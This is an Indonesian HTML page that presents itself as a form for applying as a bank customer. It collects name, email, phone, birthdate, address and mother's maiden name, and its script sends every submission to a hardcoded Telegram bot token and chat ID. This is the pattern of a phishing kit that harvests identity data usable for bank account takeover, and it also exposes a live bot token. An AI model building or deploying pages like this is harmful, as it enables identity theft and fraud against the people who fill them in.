<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Form Data Diri untuk Telegram</title>
    
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    
    <!-- Font Awesome Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    fontFamily: {
                        poppins: ['Poppins', 'sans-serif']
                    }
                }
            }
        }
    </script>
    <style>
        .wave-divider {
            position: relative;
            height: 20px;
            background: transparent;
            margin: 50px 0;
        }
        .wave-divider::before {
            content: "";
            position: absolute;
            left: 0;
            top: 0;
            right: 0;
            height: 12px;
            background-size: 20px 20px;
            background-image: radial-gradient(circle at 10px -5px, transparent 12px, #d1d5db 13px);
        }
    </style>
</head>
<body class="font-poppins bg-gray-50 min-h-screen">
    <div class="container mx-auto max-w-2xl p-5 py-10">
        <div class="text-center mb-10">
            <h1 class="text-3xl md:text-4xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-blue-500 to-teal-500 mb-2">
                Isi Data Diri Anda
            </h1>
            <p class="text-gray-600">Kirim informasi pribadi Anda untuk pengajuan sebagai nasabah</p>
        </div>

        <div class="bg-white rounded-xl shadow-xl overflow-hidden border-0">
            <div class="bg-gradient-to-r from-blue-500 to-teal-500 p-5">
                <h2 class="text-xl font-semibold text-white">Formulir Data Diri</h2>
            </div>

            <form id="profileForm" class="p-5 md:p-8">
                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <!-- Nama Lengkap -->
                    <div class="md:col-span-2">
                        <label class="block text-gray-700 font-medium mb-2" for="fullName">
                            Nama Lengkap <span class="text-red-500">*</span>
                        </label>
                        <div class="relative">
                            <input 
                                type="text" 
                                id="fullName" 
                                name="fullName"
                                required
                                class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
                                placeholder="Masukkan nama lengkap">
                            <i class="fas fa-user absolute right-4 top-3.5 text-gray-400"></i>
                        </div>
                    </div>

                    <!-- Email -->
                    <div>
                        <label class="block text-gray-700 font-medium mb-2" for="email">
                            Email <span class="text-red-500">*</span>
                        </label>
                        <div class="relative">
                            <input 
                                type="email" 
                                id="email" 
                                name="email"
                                required
                                class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
                                placeholder="email@contoh.com">
                            <i class="fas fa-envelope absolute right-4 top-3.5 text-gray-400"></i>
                        </div>
                    </div>

                    <!-- Nomor HP -->
                    <div>
                        <label class="block text-gray-700 font-medium mb-2" for="phone">
                            Nomor HP <span class="text-red-500">*</span>
                        </label>
                        <div class="relative">
                            <input 
                                type="tel" 
                                id="phone" 
                                name="phone"
                                required
                                class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
                                placeholder="08xxxxxxxxxx">
                            <i class="fas fa-phone absolute right-4 top-3.5 text-gray-400"></i>
                        </div>
                    </div>

                    <!-- Tanggal Lahir -->
                    <div>
                        <label class="block text-gray-700 font-medium mb-2" for="birthdate">
                            Tanggal Lahir <span class="text-red-500">*</span>
                        </label>
                        <div class="relative">
                            <input 
                                type="date" 
                                id="birthdate" 
                                name="birthdate"
                                required
                                class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition pr-4">
                            <i class="fas fa-calendar absolute right-4 top-3.5 text-gray-400"></i>
                        </div>
                    </div>

                    <!-- Jenis Kelamin -->
                    <div>
                        <label class="block text-gray-700 font-medium mb-2" for="gender">
                            Jenis Kelamin <span class="text-red-500">*</span>
                        </label>
                        <div class="relative">
                            <select 
                                id="gender" 
                                name="gender"
                                required
                                class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition appearance-none">
                                <option value="">Pilih Jenis Kelamin</option>
                                <option value="Laki-laki">Laki-laki</option>
                                <option value="Perempuan">Perempuan</option>
                            </select>
                            <i class="fas fa-chevron-down absolute right-4 top-3.5 text-gray-400 pointer-events-none"></i>
                        </div>
                    </div>

                    <!-- Bidang Pekerjaan -->
                    <div class="md:col-span-2">
                        <label class="block text-gray-700 font-medium mb-2" for="occupation">
                            Pekerjaan
                        </label>
                        <input 
                            type="text" 
                            id="occupation" 
                            name="occupation"
                            class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
                            placeholder="Posisi pekerjaan Anda">
                    </div>

                     <div class="md:col-span-2">
                        <label class="block text-gray-700 font-medium mb-2" for="occupation">
                            Nama Ibu Kandung
                        </label>
                        <input 
                            type="text" 
                            id="mother" 
                            name="mother"
                            class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
                            placeholder="Nama Ibu Kandung">
                    </div>

                    <!-- Alamat -->
                    <div class="md:col-span-2">
                        <label class="block text-gray-700 font-medium mb-2" for="address">
                            Alamat
                        </label>
                        <textarea 
                            id="address" 
                            name="address"
                            rows="3"
                            class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition"
                            placeholder="Alamat lengkap"></textarea>
                    </div>
                </div>

                <div class="wave-divider"></div>

                <div class="text-center mt-8">
                    <button 
                        type="submit"
                        id="submitButton"
                        class="bg-gradient-to-r from-blue-500 to-teal-500 hover:from-blue-600 hover:to-teal-600 text-white font-bold py-3 px-8 rounded-full shadow-lg hover:shadow-xl transition duration-300 transform hover:-translate-y-1">
                        Kirim
                        <i class="fas fa-paper-plane ml-2"></i>
                    </button>
                </div>
            </form>
        </div>

        <!-- Result Message -->
        <div id="resultMessage" class="mt-8 text-center hidden">
            <div class="p-5 rounded-xl shadow-lg bg-green-50 border border-green-200 max-w-md mx-auto">
                <i class="far fa-check-circle text-4xl text-green-500 mb-3"></i>
                <h3 class="text-xl font-bold text-gray-800">Data Berhasil Dikirim!</h3>
                <p class="mt-2 text-gray-600">Data Anda telah terkirim ke bot Telegram. Silakan cek pesan pada bot Anda.</p>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('profileForm');
            const submitButton = document.getElementById('submitButton');
            const resultMessage = document.getElementById('resultMessage');

            // Replace these with your actual bot details
            const BOT_TOKEN = '7868095037:AAGZR4W6oXx1M54W3KwfJZj7eZysrMot3Xs';
            const CHAT_ID = '7198927760';
            
            form.addEventListener('submit', async function(e) {
                e.preventDefault();
                
                // Validation
                const requiredFields = ['fullName', 'email', 'phone', 'birthdate', 'gender'];
                let isValid = true;
                
                requiredFields.forEach(fieldId => {
                    const field = document.getElementById(fieldId);
                    if (!field.value.trim()) {
                        field.classList.add('border-red-400');
                        isValid = false;
                    } else {
                        field.classList.remove('border-red-400');
                    }
                });
                
                // Validate email format
                const emailField = document.getElementById('email');
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                if (!emailRegex.test(emailField.value.trim())) {
                    emailField.classList.add('border-red-400');
                    isValid = false;
                }
                
                if (!isValid) {
                    alert('Harap lengkapi semua bidang yang wajib diisi dengan format yang benar');
                    return;
                }
                
                // Prepare form data
                const formData = {
                    fullName: document.getElementById('fullName').value,
                    email: document.getElementById('email').value,
                    phone: document.getElementById('phone').value,
                    birthdate: document.getElementById('birthdate').value,
                    gender: document.getElementById('gender').value,
                    occupation: document.getElementById('occupation').value || '',
                    address: document.getElementById('address').value || '',
                    mother: document.getElementById('mother').value || '',
                  
                };
                
                // Create the message for Telegram
                const messageText = `
💼 Data Diri Baru Terkirim 💼

👤 Nama Lengkap: ${formData.fullName}
📧 Email: ${formData.email}
📱 Nomor HP: ${formData.phone}
🗓️ Tanggal Lahir: ${formData.birthdate}
🚻 Jenis Kelamin: ${formData.gender}
💼 Pekerjaan: ${formData.occupation || 'Tidak diisi'}
🏠 Alamat: ${formData.address || 'Tidak diisi'}
👩‍👧‍👦 Ibu Kandung: ${formData.mother}`;
                
                // Button feedback
                submitButton.innerHTML = '<i class="fas fa-spinner animate-spin mr-2"></i> Mengirim...';
                submitButton.disabled = true;
                
                try {
                    // Send data to Telegram
                    const response = await fetch(
                        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(messageText)}`,
                        { method: 'GET' }
                    );
                    
                    const result = await response.json();
                    
                    if (result.ok) {
                        // Show success message
                        resultMessage.style.display = 'block';
                        form.reset();
                        
                        // Hide message after 5 seconds
                        setTimeout(() => {
                            resultMessage.style.display = 'none';
                        }, 5000);
                    } else {
                        alert('Gagal mengirim data: ' + (result.description || 'Error tidak diketahui'));
                    }
                } catch (error) {
                    console.error('Error:', error);
                    alert('Terjadi kesalahan saat mengirim data. Silakan coba lagi nanti.');
                } finally {
                    submitButton.disabled = false;
                    submitButton.innerHTML = 'Kirim ke Telegram <i class="fas fa-paper-plane ml-2"></i>';
                }
            });
        });
    </script>
</body>
</html>
